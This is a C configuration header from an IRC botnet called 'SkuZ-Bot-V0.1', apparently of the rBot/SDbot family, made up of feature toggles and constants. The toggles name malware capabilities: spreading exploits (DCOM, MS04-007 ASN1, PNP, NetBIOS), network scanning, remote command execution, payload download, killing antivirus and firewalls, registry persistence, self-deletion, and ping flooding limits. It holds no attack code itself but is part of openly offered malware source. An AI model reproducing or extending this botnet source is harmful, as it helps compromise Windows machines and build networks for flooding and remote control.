/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
///////////////////////////////////////////////// 
// #define NO_NETBIOS
// #define NO_DSS
// #define NO_LAND
// #define NO_DCOM
// #define NO_MS04007ASN1
// #define NO_MAP
// #define NO_PNP
// #define NP_MASSASN
// #define NO_NETINFO
// #define NO_SYSINFO
// #define NO_DCC
// #define NO_REMOTECMD
// #define NO_PROCESS
// #define NO_DOWNLOAD
// #define NO_CONNCHECK
// #define NO_BOTVERSION
// #define NO_SCAN
// #define NO_SECURE
// #define NO_REDIRECT
// #define NO_SOCK4SERV
// #define NO_HTTP
// #define NO_TFTP
// #define NO_FTPD
// #define NO_WILDCARD
// #define NO_EHANDLER
// #define NO_CRASH
// #define DUMP_ENCRYPT
// #define DEBUG_LOGGING
// #define DEBUG_CONSOLE
// #define NO_MIRCNICK
// #define NO_MODEONCONN
// #define NO_NET
// #define NO_AVFW_KILL
// #define NO_REGISTRY
// #define NO_SECSYSTEM
// #define NO_MELT

#define NO_IDENT         // disables Ident server
#define NO_REALNICK      // disables Real nick function
#define DEBUG_CRYPT      // enables bot string dump in order to try to debug the Crypt() function
//#define NO_CRYPT       // disables Crypted Strings (disabled when using DUMP_ENCRYPT)


#ifdef DUMP_ENCRYPT
#define NO_CRYPT
#endif

#define IRCLINE			512
#define MAXTHREADS		500
#define MAXALIASES		16
#define LOGSIZE			128
#define LOGLINE			128
#define MAXLOGINS		1
#define MAX_LINES		500
#define MAXSCANTHRD		500
#define MAXSCANTIME		1000
#define MAXHOSTNAME		255
#define BLOCKSIZE		512
#define FLOOD_DELAY		2000
#define MAXSTRLEN		500
#define MAXNICKLEN		28
#define MAXPINGSIZE		65500
#define MAXTOKENS		32

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#define addpredefinedaliases()
/////////////////////////////////////////////////
//       SkuZ-Bot-V0.1    By Skonk & BuZ       //
///////////////////////////////////////////////// 